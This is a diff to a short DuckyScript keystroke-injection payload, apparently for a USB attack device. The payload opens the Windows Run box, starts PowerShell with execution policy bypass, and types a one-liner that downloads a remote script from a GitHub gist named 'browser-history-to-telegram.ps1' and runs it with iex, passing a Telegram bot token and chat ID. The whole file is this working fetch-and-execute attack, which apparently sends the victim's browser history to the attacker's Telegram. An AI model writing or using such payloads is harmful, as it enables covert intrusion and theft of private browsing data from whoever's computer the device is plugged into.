@@ -1,8 +1,8 @@
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C $hide='y'
+STRING powershell -Ep Bypass
 ENTER
 DELAY 1000
-STRING powershell -Ep Bypass -C $hide='y';$tg='TGBotToken';$ChatID='Your telegram ID';iex (irm https://gist.githubusercontent.com/kr3v3tochka/7a591a11bbaa6910d111129ac9115d3c/raw/47c1d3b97abd7ece7251400ae1c527cfc9454f55/browser-history-to-telegram.ps1)
+STRING $tg='TGBotToken';$ChatID='Your telegram ID';iex (irm https://gist.githubusercontent.com/kr3v3tochka/7a591a11bbaa6910d111129ac9115d3c/raw/47c1d3b97abd7ece7251400ae1c527cfc9454f55/browser-history-to-telegram.ps1)
 ENTER 
